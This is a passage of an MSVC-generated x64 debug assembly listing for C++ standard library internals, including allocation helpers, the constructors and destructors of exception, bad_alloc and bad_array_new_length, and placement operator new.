  00081	72 09		 jb	 SHORT $LN8@Adjust_man
  00083	48 83 7d 68 27	 cmp	 QWORD PTR _Back_shift$[rbp], 39 ; 00000027H
  00088	77 02		 ja	 SHORT $LN8@Adjust_man
  0008a	eb 0b		 jmp	 SHORT $LN9@Adjust_man
$LN8@Adjust_man:
$LN7@Adjust_man:
  0008c	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  00091	33 c0		 xor	 eax, eax
  00093	85 c0		 test	 eax, eax
  00095	75 f5		 jne	 SHORT $LN7@Adjust_man
$LN9@Adjust_man:
  00097	33 c0		 xor	 eax, eax
  00099	85 c0		 test	 eax, eax
  0009b	75 df		 jne	 SHORT $LN4@Adjust_man

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  0009d	48 8b 85 60 01
	00 00		 mov	 rax, QWORD PTR _Ptr$[rbp]
  000a4	48 8b 4d 28	 mov	 rcx, QWORD PTR _Ptr_container$[rbp]
  000a8	48 89 08	 mov	 QWORD PTR [rax], rcx
$LN10@Adjust_man:

; 179  : }

  000ab	48 8d a5 48 01
	00 00		 lea	 rsp, QWORD PTR [rbp+328]
  000b2	5f		 pop	 rdi
  000b3	5d		 pop	 rbp
  000b4	c3		 ret	 0
?_Adjust_manually_vector_aligned@std@@YAXAEAPEAXAEA_K@Z ENDP ; std::_Adjust_manually_vector_aligned
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z
_TEXT	SEGMENT
_Bytes$ = 224
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z PROC ; std::_Default_allocate_traits::_Allocate, COMDAT

; 89   :         void* _Allocate(const size_t _Bytes) {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 90   :         return ::operator new(_Bytes);

  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR _Bytes$[rbp]
  00026	e8 00 00 00 00	 call	 ??2@YAPEAX_K@Z		; operator new

; 91   :     }

  0002b	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00032	5f		 pop	 rdi
  00033	5d		 pop	 rbp
  00034	c3		 ret	 0
?_Allocate@_Default_allocate_traits@std@@SAPEAX_K@Z ENDP ; std::_Default_allocate_traits::_Allocate
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
;	COMDAT ?_Throw_bad_array_new_length@std@@YAXXZ
_TEXT	SEGMENT
$T1 = 200
?_Throw_bad_array_new_length@std@@YAXXZ PROC		; std::_Throw_bad_array_new_length, COMDAT

; 63   : [[noreturn]] inline void _Throw_bad_array_new_length() {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec 18 01
	00 00		 sub	 rsp, 280		; 00000118H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__45A7EC28_xmemory
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 64   :     _THROW(bad_array_new_length{});

  0001b	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00022	e8 00 00 00 00	 call	 ??0bad_array_new_length@std@@QEAA@XZ ; std::bad_array_new_length::bad_array_new_length
  00027	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:_TI3?AVbad_array_new_length@std@@
  0002e	48 8d 8d c8 00
	00 00		 lea	 rcx, QWORD PTR $T1[rbp]
  00035	e8 00 00 00 00	 call	 _CxxThrowException
$LN2@Throw_bad_:

; 65   : }

  0003a	48 8d a5 f8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+248]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?_Throw_bad_array_new_length@std@@YAXXZ ENDP		; std::_Throw_bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_array_new_length@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_array_new_length@std@@UEAAPEAXI@Z PROC		; std::bad_array_new_length::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_array_new_length@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_array_new_length@std@@UEAAPEAXI@Z ENDP		; std::bad_array_new_length::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_array_new_length@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_array_new_length@std@@QEAA@AEBV01@@Z PROC	; std::bad_array_new_length::bad_array_new_length, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0bad_alloc@std@@QEAA@AEBV01@@Z
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@AEBV01@@Z ENDP	; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_array_new_length@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_array_new_length@std@@UEAA@XZ PROC		; std::bad_array_new_length::~bad_array_new_length, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_array_new_length@std@@UEAA@XZ ENDP		; std::bad_array_new_length::~bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_array_new_length@std@@QEAA@XZ
_TEXT	SEGMENT
this$ = 224
??0bad_array_new_length@std@@QEAA@XZ PROC		; std::bad_array_new_length::bad_array_new_length, COMDAT

; 141  :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 140  :         : bad_alloc("bad array new length")

  0001f	48 8d 15 00 00
	00 00		 lea	 rdx, OFFSET FLAT:??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
  00026	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0002d	e8 00 00 00 00	 call	 ??0bad_alloc@std@@AEAA@QEBD@Z ; std::bad_alloc::bad_alloc

; 141  :     {

  00032	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00039	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_array_new_length@std@@6B@
  00040	48 89 08	 mov	 QWORD PTR [rax], rcx

; 142  :     }

  00043	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0004a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00051	5f		 pop	 rdi
  00052	5d		 pop	 rbp
  00053	c3		 ret	 0
??0bad_array_new_length@std@@QEAA@XZ ENDP		; std::bad_array_new_length::bad_array_new_length
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gbad_alloc@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gbad_alloc@std@@UEAAPEAXI@Z PROC			; std::bad_alloc::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1bad_alloc@std@@UEAA@XZ
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gbad_alloc@std@@UEAAPEAXI@Z ENDP			; std::bad_alloc::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??0bad_alloc@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
__that$ = 232
??0bad_alloc@std@@QEAA@AEBV01@@Z PROC			; std::bad_alloc::bad_alloc, COMDAT
$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR __that$[rbp]
  0001f	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@AEBV01@@Z ; std::exception::exception
  0002b	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00032	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  00039	48 89 08	 mov	 QWORD PTR [rax], rcx
  0003c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??0bad_alloc@std@@QEAA@AEBV01@@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??1bad_alloc@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1bad_alloc@std@@UEAA@XZ PROC				; std::bad_alloc::~bad_alloc, COMDAT
$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001a	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  0001f	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00026	5f		 pop	 rdi
  00027	5d		 pop	 rbp
  00028	c3		 ret	 0
??1bad_alloc@std@@UEAA@XZ ENDP				; std::bad_alloc::~bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0bad_alloc@std@@AEAA@QEBD@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
??0bad_alloc@std@@AEAA@QEBD@Z PROC			; std::bad_alloc::bad_alloc, COMDAT

; 130  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 129  :         : exception(_Message, 1)

  00024	41 b8 01 00 00
	00		 mov	 r8d, 1
  0002a	48 8b 95 e8 00
	00 00		 mov	 rdx, QWORD PTR _Message$[rbp]
  00031	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00038	e8 00 00 00 00	 call	 ??0exception@std@@QEAA@QEBDH@Z ; std::exception::exception

; 130  :     {

  0003d	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00044	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7bad_alloc@std@@6B@
  0004b	48 89 08	 mov	 QWORD PTR [rax], rcx

; 131  :     }

  0004e	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00055	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0005c	5f		 pop	 rdi
  0005d	5d		 pop	 rbp
  0005e	c3		 ret	 0
??0bad_alloc@std@@AEAA@QEBD@Z ENDP			; std::bad_alloc::bad_alloc
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
;	COMDAT ??_Gexception@std@@UEAAPEAXI@Z
_TEXT	SEGMENT
this$ = 224
__flags$ = 232
??_Gexception@std@@UEAAPEAXI@Z PROC			; std::exception::`scalar deleting destructor', COMDAT
$LN4:
  00000	89 54 24 10	 mov	 DWORD PTR [rsp+16], edx
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0001e	e8 00 00 00 00	 call	 ??1exception@std@@UEAA@XZ ; std::exception::~exception
  00023	8b 85 e8 00 00
	00		 mov	 eax, DWORD PTR __flags$[rbp]
  00029	83 e0 01	 and	 eax, 1
  0002c	85 c0		 test	 eax, eax
  0002e	74 11		 je	 SHORT $LN2@scalar
  00030	ba 18 00 00 00	 mov	 edx, 24
  00035	48 8b 8d e0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0003c	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN2@scalar:
  00041	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00048	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004f	5f		 pop	 rdi
  00050	5d		 pop	 rbp
  00051	c3		 ret	 0
??_Gexception@std@@UEAAPEAXI@Z ENDP			; std::exception::`scalar deleting destructor'
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ?what@exception@std@@UEBAPEBDXZ
_TEXT	SEGMENT
tv69 = 192
this$ = 240
?what@exception@std@@UEBAPEBDXZ PROC			; std::exception::what, COMDAT

; 94   :     {

$LN5:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 95   :         return _Data._What ? _Data._What : "Unknown exception";

  0001f	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 83 78 08 00	 cmp	 QWORD PTR [rax+8], 0
  0002b	74 14		 je	 SHORT $LN3@what
  0002d	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00034	48 8b 40 08	 mov	 rax, QWORD PTR [rax+8]
  00038	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
  0003f	eb 0e		 jmp	 SHORT $LN4@what
$LN3@what:
  00041	48 8d 05 00 00
	00 00		 lea	 rax, OFFSET FLAT:??_C@_0BC@EOODALEL@Unknown?5exception@
  00048	48 89 85 c0 00
	00 00		 mov	 QWORD PTR tv69[rbp], rax
$LN4@what:
  0004f	48 8b 85 c0 00
	00 00		 mov	 rax, QWORD PTR tv69[rbp]

; 96   :     }

  00056	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  0005d	5f		 pop	 rdi
  0005e	5d		 pop	 rbp
  0005f	c3		 ret	 0
?what@exception@std@@UEBAPEBDXZ ENDP			; std::exception::what
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??1exception@std@@UEAA@XZ
_TEXT	SEGMENT
this$ = 224
??1exception@std@@UEAA@XZ PROC				; std::exception::~exception, COMDAT

; 89   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  0002d	48 89 08	 mov	 QWORD PTR [rax], rcx

; 90   :         __std_exception_destroy(&_Data);

  00030	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00037	48 83 c0 08	 add	 rax, 8
  0003b	48 8b c8	 mov	 rcx, rax
  0003e	e8 00 00 00 00	 call	 __std_exception_destroy

; 91   :     }

  00043	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0004a	5f		 pop	 rdi
  0004b	5d		 pop	 rbp
  0004c	c3		 ret	 0
??1exception@std@@UEAA@XZ ENDP				; std::exception::~exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@AEBV01@@Z
_TEXT	SEGMENT
this$ = 224
_Other$ = 232
??0exception@std@@QEAA@AEBV01@@Z PROC			; std::exception::exception, COMDAT

; 72   :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00024	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00032	48 89 08	 mov	 QWORD PTR [rax], rcx

; 71   :         : _Data()

  00035	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0003c	48 83 c0 08	 add	 rax, 8
  00040	48 8b f8	 mov	 rdi, rax
  00043	33 c0		 xor	 eax, eax
  00045	b9 10 00 00 00	 mov	 ecx, 16
  0004a	f3 aa		 rep stosb

; 73   :         __std_exception_copy(&_Other._Data, &_Data);

  0004c	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00053	48 83 c0 08	 add	 rax, 8
  00057	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Other$[rbp]
  0005e	48 83 c1 08	 add	 rcx, 8
  00062	48 8b d0	 mov	 rdx, rax
  00065	e8 00 00 00 00	 call	 __std_exception_copy

; 74   :     }

  0006a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00071	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00078	5f		 pop	 rdi
  00079	5d		 pop	 rbp
  0007a	c3		 ret	 0
??0exception@std@@QEAA@AEBV01@@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_exception.h
;	COMDAT ??0exception@std@@QEAA@QEBDH@Z
_TEXT	SEGMENT
this$ = 224
_Message$ = 232
__formal$ = 240
??0exception@std@@QEAA@QEBDH@Z PROC			; std::exception::exception, COMDAT

; 66   :     {

$LN3:
  00000	44 89 44 24 18	 mov	 DWORD PTR [rsp+24], r8d
  00005	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  0000a	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000f	55		 push	 rbp
  00010	57		 push	 rdi
  00011	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00018	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0001d	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__85F4241F_vcruntime_exception@h
  00024	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode
  00029	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00030	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:??_7exception@std@@6B@
  00037	48 89 08	 mov	 QWORD PTR [rax], rcx

; 65   :         : _Data()

  0003a	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00041	48 83 c0 08	 add	 rax, 8
  00045	48 8b f8	 mov	 rdi, rax
  00048	33 c0		 xor	 eax, eax
  0004a	b9 10 00 00 00	 mov	 ecx, 16
  0004f	f3 aa		 rep stosb

; 67   :         _Data._What = _Message;

  00051	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00058	48 8b 8d e8 00
	00 00		 mov	 rcx, QWORD PTR _Message$[rbp]
  0005f	48 89 48 08	 mov	 QWORD PTR [rax+8], rcx

; 68   :     }

  00063	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0006a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00071	5f		 pop	 rdi
  00072	5d		 pop	 rbp
  00073	c3		 ret	 0
??0exception@std@@QEAA@QEBDH@Z ENDP			; std::exception::exception
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\limits
;	COMDAT ?max@?$numeric_limits@_J@std@@SA_JXZ
_TEXT	SEGMENT
?max@?$numeric_limits@_J@std@@SA_JXZ PROC		; std::numeric_limits<__int64>::max, COMDAT

; 635  :     _NODISCARD static constexpr long long(max)() noexcept {

$LN3:
  00000	40 55		 push	 rbp
  00002	57		 push	 rdi
  00003	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000a	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  0000f	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__09FBC026_limits
  00016	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 636  :         return LLONG_MAX;

  0001b	48 b8 ff ff ff
	ff ff ff ff 7f	 mov	 rax, 9223372036854775807 ; 7fffffffffffffffH

; 637  :     }

  00025	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  0002c	5f		 pop	 rdi
  0002d	5d		 pop	 rbp
  0002e	c3		 ret	 0
?max@?$numeric_limits@_J@std@@SA_JXZ ENDP		; std::numeric_limits<__int64>::max
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\vcruntime_new.h
;	COMDAT ??2@YAPEAX_KPEAX@Z
_TEXT	SEGMENT
_Size$ = 224
_Where$ = 232
??2@YAPEAX_KPEAX@Z PROC					; operator new, COMDAT

; 168  :     {

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__A3D3E4E8_vcruntime_new@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 169  :         (void)_Size;
; 170  :         return _Where;

  00024	48 8b 85 e8 00
	00 00		 mov	 rax, QWORD PTR _Where$[rbp]

; 171  :     }

  0002b	48 8d a5 c8 00
